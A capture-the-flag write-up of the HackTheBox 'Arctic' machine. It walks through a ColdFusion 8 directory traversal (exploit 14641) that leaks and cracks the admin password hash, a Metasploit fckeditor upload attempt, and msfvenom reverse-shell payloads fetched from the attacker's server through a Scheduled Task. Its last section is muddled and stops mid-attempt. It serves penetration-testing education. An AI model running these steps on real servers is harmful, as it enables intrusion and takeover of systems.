# References
1. [Optimum Writeup (absolomb.com)](https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/)
2. [Optimum Writeup (medium.com)](https://medium.com/@Rehman.Beg/hackthebox-arctic-writeup-442d2b268833)

# Summary
### 1. NMAP

### 2. Enumeration & Attack Attempt 1: MSRPC

### 3. Enumeration & Attack Attempt 2: FMTP

### 4. Further Enumeration of Port 8500, FMTP

### 5. Finding & Attacking with Adobe ColdFusion 8 Exploits

### 6. Enumerating ColdFusion Administrative Page

### 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit

### 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks

# Attack
## 1. NMAP
Start.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.11 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 16:39 +08
...
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Windows OS, with three ports. Okay. Let's see the vulnerability script.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.11 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 16:44 +08
...
PORT      STATE SERVICE
135/tcp   open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8500/tcp  open  fmtp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```
Nevermind, let's move on.

## 2. Enumeration & Attack Attempt 1: MSRPC
Let's start finding some possible vulnerabilities.
```
hippoeug@kali:~$ searchsploit msrpc
Exploits: No Results
Shellcodes: No Results
```
Nothing. Hmm, let's Google for some potential exploits we can use, and we see [one](https://www.rapid7.com/db/modules/exploit/multi/misc/msf_rpc_console/).
```
msf5 > use exploit/multi/misc/msf_rpc_console
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > show targets
...
msf5 exploit(multi/misc/msf_rpc_console) > set target 1
target => 1
msf5 exploit(multi/misc/msf_rpc_console) > show options

Module options (exploit/multi/misc/msf_rpc_console):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     55552            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  msf              yes       Username for Metasploit RPC
...
```
Oh dang it, we need a Username and Password for the RPC. Time to try something else.

## 3. Enumeration & Attack Attempt 2: FMTP
Let's searchspoit FMTP and see what we get.
```
hippoeug@kali:~$ searchsploit fmtp
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service                                                                           | linux/dos/44183.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Crap. DoS is not what we need. We were also unable to find any potential attacks on Google.

Honestly at this point, I was stuck and had to look for some clues online. Turns out, I simply "forgotten" one of the fundamentals, which is to try accessing these ports on a web browser. Port 80 (HTTP) & port 443 (HTTPS) aren't the only ports available on a web browser!

Navigating to `http://10.10.10.11:8500`, which takes forever to load, we see what seems to be a listing of a file system.
```
Index of /

CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```
Very cool, let's see `CFIDE/` first.
```
Index of /CFIDE/

Parent ..                                              dir   03/22/17 08:52 μμ
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/                                               dir   03/22/17 08:52 μμ
```
Hmm, doing some Googling, we see `.cfm` is a Cold Fusion Markup file, which are web pages made up of specific code that enables scripts and applications to run on a ColdFusion web server. Let's KIV this.

Going top down, we enumerate `adminapi/` next.
```
Index of /CFIDE/adminapi/

Parent ..                                       dir   03/22/17 08:53 μμ
Application.cfm                                2602   03/18/08 11:06 πμ
_datasource/                                    dir   03/22/17 08:52 μμ
accessmanager.cfc                             20553   03/18/08 11:06 πμ
administrator.cfc                            164570   03/18/08 11:06 πμ
base.cfc                                      56505   03/18/08 11:06 πμ
customtags/                                     dir   03/22/17 08:52 μμ
datasource.cfc                               382660   03/18/08 11:06 πμ
debugging.cfc                                101130   03/18/08 11:06 πμ
eventgateway.cfc                              95781   03/18/08 11:06 πμ
extensions.cfc                               130902   03/18/08 11:06 πμ
flex.cfc                                      13731   03/18/08 11:06 πμ
mail.cfc                                      48694   03/18/08 11:06 πμ
runtime.cfc                                  212558   03/18/08 11:06 πμ
security.cfc                                 299192   03/18/08 11:06 πμ
servermonitoring.cfc                         451021   03/18/08 11:06 πμ
```
Ah, looks like more config files of sorts. Let's move to the next one, `administrator/`.

Enumerating to `http://10.10.10.11:8500/CFIDE/administrator/`, we see a that it is not a directory, but instead a Adobe ColdFusion 8 Administrator login page, with a Username `admin` that cannot be changed.

We got a few ways to continue this, either looking for a password to login, search for vulnerabities with searchsploit etc, dirbuster this, or something.

## 4. Further Enumeration of Port 8500, FMTP
Inspecting the source page of the `CFIDE/administrator/` login page, we see something interesting.
```
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```
From this, we know that the salted password is encrypted with SHA1.

Let's enumerate a little more down the list of directories.
```
Index of /CFIDE/classes/

Parent ..                                 dir   03/22/17 08:52 μμ
cf-j2re-win.cab                       5073487   03/18/08 11:06 πμ
cfapplets.jar                           87810   03/18/08 11:06 πμ
images/                                   dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/componentutils/

Parent ..                                                 dir   03/22/17 08:52 μμ
Application.cfm                                          2477   03/18/08 11:07 πμ
_component_cfcToHTML.cfm                                 8560   03/18/08 11:07 πμ
_component_cfcToMCDL.cfm                                 2643   03/18/08 11:07 πμ
_component_style.cfm                                      462   03/18/08 11:07 πμ
_component_utils.cfm                                     7247   03/18/08 11:07 πμ
cfcexplorer.cfc                                         11121   03/18/08 11:07 πμ
cfcexplorer_utils.cfm                                    6557   03/18/08 11:07 πμ
componentdetail.cfm                                      1215   03/18/08 11:07 πμ
componentdoc.cfm                                          629   03/18/08 11:07 πμ
componentlist.cfm                                        1212   03/18/08 11:07 πμ
gatewaymenu/                                              dir   03/22/17 08:52 μμ
login.cfm                                               19984   03/18/08 11:06 πμ
packagelist.cfm                                          1286   03/18/08 11:07 πμ
utils.cfc                                                1180   03/18/08 11:07 πμ
```
```
Index of /CFIDE/debug/

Parent ..                              dir   03/22/17 08:52 μμ
blank.html                              78   03/18/08 11:06 πμ
cf_debugFr.cfm                        2843   03/18/08 11:06 πμ
images/                                dir   03/22/17 08:52 μμ
includes/                              dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/debug/includes/

Parent ..                                         dir   03/22/17 08:52 μμ
cf_debug_main.js                                 1195   03/18/08 11:06 πμ
```
```
Index of /CFIDE/images/

Parent ..                             dir   03/22/17 08:52 μμ
required.gif                           94   03/18/08 11:07 πμ
skins/                                dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/scripts/

Parent ..                                        dir   03/22/17 08:52 μμ
CF_RunActiveContent.js                           116   03/18/08 11:07 πμ
ajax/                                            dir   03/22/17 08:52 μμ
cfform-src.js                                  22480   03/18/08 11:07 πμ
cfform.js                                      10617   03/18/08 11:07 πμ
cfform.swc                                    424916   03/18/08 11:07 πμ
cfformhistory.cfm                               4120   03/18/08 11:06 πμ
cfformhistory.js                                1616   03/18/08 11:07 πμ
cfformhistory.swf                               2656   03/18/08 11:07 πμ
css/                                             dir   03/22/17 08:52 μμ
dump.js                                         5142   03/18/08 11:07 πμ
fpwrapper.fla                                 165376   03/18/08 11:07 πμ
fpwrapper.swf                                  27476   03/18/08 11:07 πμ
masks-src.js                                    9393   03/18/08 11:07 πμ
masks.js                                        3897   03/18/08 11:07 πμ
wddx.js                                        22617   03/18/08 11:07 πμ
xsl/                                             dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/wizards/

Parent ..                         dir   03/22/17 08:52 μμ
common/                           dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/wizards/common/

Parent ..                                                    dir   03/22/17 08:52 μμ
_authenticatewizarduser.cfm                                 1585   03/18/08 11:07 πμ
_logintowizard.cfm                                          7135   03/18/08 11:07 πμ
utils.cfc                                                   1596   03/18/08 11:07 πμ
```
Ah, we cannot find a file that we can use to our advantage.

## 5. Finding & Attacking with Adobe ColdFusion 8 Exploits
As usual, we will do a Searchsploit on Adobe ColdFusion 8.
```
hippoeug@kali:~$ searchsploit coldfusion
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                 | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                              | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                 | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                         | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                       | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                   | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                  | cfm/webapps/36172.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                           | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                              | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                     | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                           | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                        | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                     | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                              | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                               | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                 | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                       | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                                              | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                   | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                             | multiple/webapps/25305.py
...
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Already, we see some interesting results, lots of options to try.

To aid our job, we also do a Google search in hopes of finding the most common vulnerability, one we could try first.
We see [exploit](https://www.exploit-db.com/exploits/14641) `Adobe ColdFusion - Directory Traversal 14641.py`. Apparently, this exploit "exploits a directory traversal bug in Adobe ColdFusion, by reading the password.properties a user can login using the encrypted password itself. This should work on version 8 and below.".

Additionally, another [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute`. We might need to try this later on if a payload if required to be uploaded.

Let's try the `Directory Traversal` exploit, `14641.py`.
```
hippoeug@kali:~$ searchsploit -m 14641.py
  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable, with CRLF line terminators

hippoeug@kali:~$ python 14641.py
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

hippoeug@kali:~$ python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```
Ooh! Very interesting, we see a password `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`, which looks like a Hash. Since we know from earlier password is a SHA1 hash, we can use Crackstation to get the password.
```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03	sha1	happyday
```
With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/administrator/` and try to login.

We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!

NOTE: While browsing through other write-ups, I found out that navigating directly to URL `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`, taken from [14641.py](https://www.exploit-db.com/exploits/14641), displays the hash password on screen immediately. 

## 6. Enumerating ColdFusion Administrative Page
Looking through the Administrator page, we could only see various Menus to view or modify.
```
Expand All / Collapse All

Server Settings 
	Settings
	Request Tuning
	Caching
	Client Variables
	Memory Variables
	Mappings
	Mail
	Charting
	Font Management
	Java and JVM
	Settings Summary
Data & Services
	Data Sources
	Verity Collections
	Verity K2 Server
	Web Services
	Flex Integration
Debugging & Logging
	Debug Output Settings
	Debugging IP Addresses
	Debugger Settings
	Logging Settings
	Log Files
	Scheduled Tasks
	System Probes
	Code Analyzer
	License Scanner
Server Monitoring
	Server Monitor
Extensions
	Java Applets
	CFX Tags
	Custom Tag Paths
	CORBA Connectors
Event Gateways
	Settings
	Gateway Types
	Gateway Instances
Security
	Administrator
	RDS
	Sandbox Security
	User Manager
Packaging & Deployment
	ColdFusion Archives
	J2EE Archives
```
Nothing interesting unfortunately. Suddenly, on the top right corner, I noticed a "System Information" button.

Here's the System Information:
```
Server Details
Server Product 	ColdFusion
Version 	8,0,1,195765  
Edition 	Developer  
Serial Number 	Developer  
Operating System 	Windows Vista  
OS Version 	6.1  

JVM Details
Java Version 	1.6.0_04  
Java Vendor 	Sun Microsystems Inc.  
Java Vendor URL 	http://java.sun.com/
Java Home 	C:\ColdFusion8\runtime\jre  
Java File Encoding 	Cp1253  
Java Default Locale 	el_GR  
File Separator 	\  
Path Separator 	;  
Line Separator 	Chr(13)
User Name 	tolis  
User Home 	C:\Users\tolis  
User Dir 	C:\ColdFusion8\runtime\bin  
Java VM Specification Version 	1.0  
Java VM Specification Vendor 	Sun Microsystems Inc.  
Java VM Specification Name 	Java Virtual Machine Specification  
Java VM Version 	10.0-b19  
Java VM Vendor 	Sun Microsystems Inc.  
Java VM Name 	Java HotSpot(TM) 64-Bit Server VM  
Java Specification Version 	1.6  
Java Specification Vendor 	Sun Microsystems Inc.  
Java Specification Name 	Java Platform API Specification  
Java Class Version 	50.0  
...

Printer Details
Default Printer 	Microsoft XPS Document Writer
Printers 	Microsoft XPS Document Writer 
```
Perfect. We now know it's a Windows Vista 6.1, running ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user `tolis`, path `C:\Users\tolis`.

## 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
As we noted previously, it is perhaps time to deploy the [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload.
```
msf5 > use exploit/windows/http/coldfusion_fckeditor
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf5 exploit(windows/http/coldfusion_fckeditor) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf5 exploit(windows/http/coldfusion_fckeditor) > show targets
...
msf5 exploit(windows/http/coldfusion_fckeditor) > set rhost 10.10.10.11
rhost => 10.10.10.11
msf5 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
rport => 8500
...
msf5 exploit(windows/http/coldfusion_fckeditor) > show options

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          8500                                                                        yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                      no        HTTP server virtual host


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.x.x      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target


msf5 exploit(windows/http/coldfusion_fckeditor) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
```
Within seconds of `[*] Sending our POST request...`, it returned with `[-] Upload Failed...`. This apparently is an unusual, quoting IppSec that every request to `10.10.10.11` takes about 30s to return something, there is no way this exploit would know that this request failed this quickly.

At this point, I am lost and looked online for guidance. The official documentation & [IppSec](https://www.youtube.com/watch?v=e9lVyFH7-4o&feature=emb_title&ab_channel=IppSec) managed to still use this `exploit/windows/http/coldfusion_fckeditor` exploit, with the use of Burp Suite. "However, due to the request delay to the target, the Metasploit module fails to run and must be intercepted in Burp Suite, then requested through Burp Repeater." 

## 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
Not wanting to use the Burp suite method, I followed an alternative method as seen from other writeups. Turns out, I missed out a tool I could leverage on from the ColdFusion administrator site.
```
Debugging & Logging
	Debug Output Settings
	Debugging IP Addresses
	Debugger Settings
	Logging Settings
	Log Files
  ----> Scheduled Tasks
	System Probes
	Code Analyzer
	License Scanner
```
Scheduled Tasks! We could use this to download and run our reverse shell payload.

Let's create a payload.
```
hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter.exe
```

Let's Schedule New Task.
```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
URL: http://10.10.x.x/meterpreter.exe
Publish: Save output to a file
File: C:\Users\tolis\meterpreter.exe
Submit
```
This task was scheduled successfully.

Let's run the Python HTTPServer also.
```
hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
```
And a nc listener.
```
hippoeug@kali:~$ nc -lvnp 4545
listening on [any] 4545 ...
```

Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".

However, we are not able to execute this `meterpreter.exe` we just placed, as we do not have access to the file path.
Getting the payload in the location user Tolis directory isn't an issue, but running it is.

We need to find a path that we have access to from the browser. Navigating to Mappings under Server Settings, we see 2 paths.
```
Server Settings 
	Settings
	Request Tuning
	Caching
	Client Variables
	Memory Variables
   ---->Mappings
	Mail
	Charting
	Font Management
	Java and JVM
	Settings Summary
	
Active ColdFusion Mappings
Actions 	Logical Path 	Directory Path
  		/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc
```

Let's Schedule New Task again.
```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
URL: http://10.10.x.x/meterpreter.exe
Publish: Save output to a file
File: C:\ColdFusion8\wwwroot\CFIDE\meterpreter.exe
Submit
```
This task was scheduled successfully.

Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".

To execute the payload we just placed, we need to go to the browser and navigate to `10.10.10.11:8500/CFIDE/meterpreter.exe`. However instead of running it, our browser attempts to download the `meterpreter.exe` payload instead. We need to find a file extension that Adobe ColdFusion is willing to run. Upon some research, we found that ColdFusion will execute `[.cfm](https://reboare.gitbooks.io/security/content/webshell.html)` & `.jsp` files.

Since msfvenom allows for creation of `.jsp` webshell easily, we'll create a `.jsp` payload instead.
```
hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter.exe
```

Let's Schedule New Task.
```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
URL: http://10.10.x.x/meterpreter.exe
Publish: Save output to a file
File: C:\Users\tolis\meterpreter.exe
Submit
```
This task was scheduled successfully.
